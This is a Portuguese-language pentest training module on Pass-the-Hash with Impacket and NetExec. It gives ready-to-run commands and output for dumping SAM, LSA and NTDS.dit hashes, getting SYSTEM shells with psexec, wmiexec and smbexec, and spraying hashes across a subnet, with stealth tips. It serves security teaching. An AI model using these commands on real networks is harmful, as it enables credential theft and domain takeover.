# 🔗 06. Pass-the-Hash e Suite Impacket

> Com um hash NTLM, você não precisa da senha — autentica direto. Impacket é a suite que transforma hashes em shells SYSTEM remotas.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 70min | ⭐⭐⭐⭐ Avançado | `impacket (psexec, wmiexec, smbexec, secretsdump), netexec` |

</div>

---

## 🎓 Por que isso importa?

Pass-the-Hash (PtH) é uma técnica onde o atacante usa um **hash NTLM roubado** para se autenticar em outro sistema **sem precisar da senha em texto plano**. Segundo o Verizon DBIR 2025, 82% dos compromissos envolvem credenciais roubadas — e PtH é o vetor que permite movimentação lateral com essas credenciais.

**Por que funciona com NTLM?** O protocolo NTLM usa challenge-response: o servidor envia um nonce, o cliente calcula a resposta usando o hash NTLM (não a senha original). O servidor valida a resposta. Se você tem o hash, pode calcular a resposta — o servidor não distingue entre hash legítimo e reutilizado.

**Impacto real:** NotPetya (2017) causou mais de **$10 bilhões** em danos mundiais usando PtH. APT28 (Fancy Bear), Wizard Spider e FIN13 usam PtH documentadamente.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| O que é hash NTLM | Sim | Arquivo 03 (cracking) |
| NetExec básico | Sim | Arquivo 03, 04 |
| Conceito de admin local vs domain admin | Sim | Arquivo 02 |

---

## 🎯 Quando usar este módulo

- Quando obteve hash NTLM de um host (via secretsdump, Mimikatz, SAM dump)
- Quando quer autenticar sem quebrar o hash (mais rápido que brute force)
- Quando quer testar se hash de um host funciona em outros (lateral movement)
- Quando quer dumpar NTDS.dit de um Domain Controller

---

## 🔄 Como funciona na prática

```
┌──────────────────────────────────────────────────────────┐
│  1. OBTER HASH NTLM                                      │
│     - secretsdump.py (SAM/LSA/NTDS.dit)                 │
│     - NetExec --sam / --lsa / --ntds                     │
│     - Mimikatz (hashdump dentro de Meterpreter)          │
│     - Captura de rede (NTLM relay)                       │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  2. VALIDAR HASH EM MASSA (NetExec)                      │
│     - Testar em subnet inteira                           │
│     - Identificar hosts onde hash funciona               │
│     - Descobrir se é admin local (Pwn3d!)                │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  3. OBTER SHELL REMOTA (Impacket)                        │
│     - psexec.py → shell interativo SYSTEM                │
│     - wmiexec.py → shell semi-interativo (stealth)       │
│     - smbexec.py → shell semi-interativo (via SMB)       │
└──────────────────────┬───────────────────────────────────┘
                       ▼
┌──────────────────────────────────────────────────────────┐
│  4. ESCALAR OU DUMPAR                                    │
│     - secretsdump.py → extrair mais hashes               │
│     - Dump NTDS.dit se for Domain Controller             │
│     - Repetir ciclo em novos hosts                       │
└──────────────────────────────────────────────────────────┘
```

---

## 🔐 Pass-the-Hash: O que é e Por que Funciona

### Definição técnica

PtH é a reutilização direta de um hash NTLM para autenticação em serviços que aceitam NTLM (SMB, WinRM, HTTP, MSSQL, etc.). O hash funciona como substituto da senha — o protocolo NTLM não valida se a senha original existe.

### Ciclo de vida do ataque

```
1. Foothold inicial (phishing, exploit, brute force)
         ↓
2. Extração de hashes (secretsdump, Mimikatz, SAM dump)
         ↓
3. Reutilização do hash (Impacket, NetExec)
         ↓
4. Movimentação lateral entre hosts
         ↓
5. Domínio completo (Domain Controller compromise)
```

### Onde os hashes ficam armazenados

| Local | Formato | Extração |
|:------|:--------|:---------|
| SAM (Security Account Manager) | Hashes locais | `secretsdump.py`, `nxc --sam` |
| LSA Secrets | Credenciais em memória | `secretsdump.py`, `nxc --lsa` |
| NTDS.dit | Hashes de domínio | `secretsdump.py -just-dc`, `nxc --ntds` |
| LSASS.exe | Hashes em memória | Mimikatz (dentro de sessão existente) |

### Formato do hash no Impacket

```
LMHASH:NTHASH
```

O LMHash geralmente é o padrão `aad3b435b51404eeaad3b435b51404ee` (hash LM vazio). O NTHash é o que realmente importa.

---

## 🛠️ Suite Impacket

### Instalação no Kali

```bash
# Método 1 — via apt (recomendado para Kali)
sudo apt update && sudo apt install -y python3-impacket

# Método 2 — via pipx (versão mais recente)
sudo apt install -y pipx
pipx ensurepath
pipx install impacket

# Verificar versão
impacket-smbexec -h
# Impacket v0.13.1 - Copyright Fortra, LLC...
```

### Scripts principais

| Script | Função | Protocolo |
|:-------|:-------|:----------|
| `impacket-psexec` | Shell interativo SYSTEM | SMB + SVCCTL RPC |
| `impacket-wmiexec` | Shell semi-interativo (stealth) | WMI via DCOM |
| `impacket-smbexec` | Shell semi-interativo (via SMB) | SMB |
| `impacket-secretsdump` | Dump de hashes (SAM, LSA, NTDS) | SMB + DRSUAPI |

---

## 🔐 secretsdump.py — Extração de Hashes

### Dump SAM (host local não-DC)

```bash
impacket-secretsdump 'EMPRESA/Administrator:Winter2025!'@192.168.1.10
```

**✅ Output esperado:**
```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x7a0127...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
EMPRESA/Administrator:$DCC2$10240:testpass123...
[*] Dumping LSA Secrets
[*] DefaultPassword
EMPRESA\Administrator:Winter2025!
[*] NTLM hash of LSA Secret:
EMPRESA\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76
[*] Cleaning up...
```

**O que procurar:** A seção `Dumping local SAM hashes` mostra `username:rid:lmhash:nthash`. O hash NTLM é o valor após o terceiro `:`.

### Dump NTDS.dit (Domain Controller)

```bash
impacket-secretsdump -just-dc 'EMPRESA/Administrator:Winter2025!'@192.168.1.1
```

**✅ Output esperado:**
```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:df09532ffda0aee89d8f9740b1849c4e:::
joao.silva:1104:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76:::
maria.santos:1105:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

### Dump com hash PtH (sem senha)

```bash
impacket-secretsdump -hashes :5fbc3d5fec8206a30f4b6c473d68ae76 EMPRESA/Administrator@192.168.1.10
```

### Flags importantes

| Flag | Descrição |
|:-----|:----------|
| `-just-dc` | Extrair apenas NTDS.dit (Domain Controller) |
| `-just-dc-ntlm` | Extrair apenas hashes NTLM do NTDS |
| `-use-vss` | Usar Volume Shadow Copy (quando DRSUAPI falha) |
| `-outputfile ARQUIVO` | Salvar output em arquivo |
| `-skip-sam` | Pular extração do SAM |
| `-skip-security` | Pular extração do SECURITY |

---

## 🔐 psexec.py — Shell Interativo SYSTEM

### Com senha

```bash
impacket-psexec 'EMPRESA/Administrator:Winter2025!'@192.168.1.10
```

### Pass-the-Hash

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 EMPRESA/Administrator@192.168.1.10
```

**✅ Output esperado:**
```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.1.10.....
[*] Found writable share ADMIN$
[*] Uploading file YzXqMnRa.exe
[*] Opening SVCManager on 192.168.1.10.....
[*] Creating service DvBgTlWq on 192.168.1.10.....
[*] Starting service DvBgTlWq.....
[!] Press help for remote shell
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

**Características:** Shell interativo completo, SYSTEM, mas ruidoso (cria serviço permanente + binário no disco).

---

## 🔐 wmiexec.py — Shell Semi-Interativo (Stealth)

### Com senha

```bash
impacket-wmiexec 'EMPRESA/Administrator:Winter2025!'@192.168.1.10
```

### Pass-the-Hash

```bash
impacket-wmiexec -hashes :5fbc3d5fec8206a30f4b6c473d68ae76 EMPRESA/Administrator@192.168.1.10
```

**✅ Output esperado:**
```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Use 'exit' to terminate
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
empresasrv\administrator

C:\Windows\system32>
```

### Executar comando único (não interativo)

```bash
impacket-wmiexec -hashes :5fbc3d5fec8206a30f4b6c473d68ae76 EMPRESA/Administrator@192.168.1.10 "ipconfig /all"
```

**Características:** Não cria serviço, não deixa binário permanente. Melhor opção para stealth.

---

## 🔐 smbexec.py — Shell Semi-Interativo (via SMB)

### Com senha

```bash
impacket-smbexec 'EMPRESA/Administrator:Winter2025!'@192.168.1.10
```

### Pass-the-Hash

```bash
impacket-smbexec -hashes :5fbc3d5fec8206a30f4b6c473d68ae76 EMPRESA/Administrator@192.168.1.10
```

**✅ Output esperado:**
```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Use 'exit' to terminate
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

**Características:** Cria serviço efêmero (temporário). Mais ruidoso que wmiexec, menos que psexec.

---

## 📊 Comparativo: psexec vs wmiexec vs smbexec

| Critério | psexec.py | wmiexec.py | smbexec.py |
|:---------|:----------|:-----------|:-----------|
| **Protocolo** | SMB + SVCCTL RPC | WMI via DCOM | SMB |
| **Cria serviço** | SIM (permanente) | NÃO | SIM (efêmero) |
| **Binário em disco** | SIM (RemComSvc) | MÍNIMO (temporário) | MÍNIMO (temporário) |
| **Shell** | Interativo | Semi-interativo | Semi-interativo |
| **Ruído para detecção** | **ALTO** | **BAIXO** | **MÉDIO** |
| **Portas** | TCP 445 | TCP 135 + 445 + porta alta | TCP 445 |
| **Quando usar** | Labs, CTFs, sem restrição | Pentest real, stealth | Se wmiexec falhar (DCOM bloqueado) |

### Regra prática

- **Laboratório/CTF:** `psexec.py` (shell interativo completo)
- **Pentest real:** `wmiexec.py` (stealth, sem binário)
- **Se DCOM bloqueado:** `smbexec.py` (só SMB)

---

## 🔐 NetExec como Alternativa para PtH em Massa

Antes de usar Impacket em um host específico, valide o hash em massa com NetExec:

```bash
# PtH em subnet inteira
nxc smb 192.168.1.0/24 -u Administrator -H :5fbc3d5fec8206a30f4b6c473d68ae76 --continue-on-success

# Output esperado
SMB  192.168.1.10  445  DC01       [+] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76 (Pwn3d!)
SMB  192.168.1.11  445  FILESRV01  [+] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76 (Pwn3d!)
SMB  192.168.1.20  445  WEBSRV01  [-] EMPRESA.LOCAL\Administrator:5fbc3d5fec8206a30f4b6c473d68ae76
```

**Workflow recomendado:**
```
1. NetExec → validar hash em massa (velocidade)
2. Identificar hosts com (Pwn3d!)
3. Impacket → shell no host desejado (profundidade)
```

### Dump via NetExec (alternativa ao secretsdump)

```bash
# SAM dump
nxc smb 192.168.1.10 -u Administrator -H :NTHASH --sam --local-auth

# LSA dump
nxc smb 192.168.1.10 -u Administrator -H :NTHASH --lsa

# NTDS.dit (Domain Controller)
nxc smb 192.168.1.10 -u Administrator -H :NTHASH --ntds
```

---

## 📋 Resumo: Fluxo Completo de PtH

| Etapa | Ferramenta | Comando |
|:------|:-----------|:--------|
| Dump SAM/LSA | NetExec | `nxc smb <IP> -u Admin -p pass --sam` |
| Dump NTDS.dit | Impacket | `impacket-secretsdump -just-dc EMPRESA/Admin:pass@DC` |
| Validar hash em massa | NetExec | `nxc smb <subnet> -u Admin -H :NTHASH --continue-on-success` |
| Shell interativo | Impacket | `impacket-psexec -hashes :NTHASH EMPRESA/Admin@IP` |
| Shell stealth | Impacket | `impacket-wmiexec -hashes :NTHASH EMPRESA/Admin@IP` |
| Dump remoto | Impacket | `impacket-secretsdump -hashes :NTHASH EMPRESA/Admin@IP` |

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `ACCESS_DENIED` no psexec | Usuário não é admin local | Verificar com `nxc smb --pass-pol` |
| `STATUS_LOGON_FAILURE` | Hash incorreto ou formato errado | Verificar formato `LM:NT` (use `:NTHASH` se LM vazio) |
| `Kerberos` em vez de NTLM | Usando hostname em vez de IP | Usar IP direto para forçar NTLM |
| psexec não cria serviço | Admin$ não acessível | Tentar wmiexec ou smbexec |
| secretsdump falha no NTDS | DRSUAPI bloqueado | Usar `-use-vss` |
| wmiexec sem output | DCOM bloqueado no firewall | Usar smbexec |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Steel Mountain](https://tryhackme.com/room/steelmountain) | Metasploit, escalação, PtH básico | 60min |
| 2 | HackTheBox | [Archetype](https://app.hackthebox.com/machines/Archetype) | MSSQL, secretsdump, PtH, escalação | 90min |
| 3 | HackTheBox | [Sauna](https://app.hackthebox.com/machines/Sauna) | AD, Kerberoasting, PtH, dump NTDS | 120min |

---

## 📚 Referências

- [Impacket GitHub (Fortra)](https://github.com/fortra/impacket)
- [Impacket PyPI](https://pypi.org/project/impacket/)
- [HackTricks — PtH](https://book.hacktricks.xyz/generic-methodologies-and-resources/evasion-lateral-movement/ntlm-pass-the-hash)
- [MITRE ATT&CK — Pass the Hash (T1550.002)](https://attack.mitre.org/techniques/T1550/002)
- [Microsoft — Mitigating PtH Attacks](https://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/)
- [NetExec Wiki](https://www.netexec.wiki/)
- [GuardSix — Impacket Arsenal](https://guardsix.com/blog/the-impacket-arsenal)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Explicar por que PtH funciona com NTLM
- [ ] Obter hash NTLM via secretsdump.py ou NetExec
- [ ] Formatar hash corretamente para Impacket (`LM:NT`)
- [ ] Usar psexec.py para obter shell interativo SYSTEM
- [ ] Usar wmiexec.py para shell stealth (sem binário)
- [ ] Usar smbexec.py quando DCOM está bloqueado
- [ ] Dumpar SAM, LSA e NTDS.dit com secretsdump.py
- [ ] Validar hash em massa com NetExec antes de usar Impacket
- [ ] Escolher a ferramenta correta para cada cenário (psexec vs wmiexec vs smbexec)
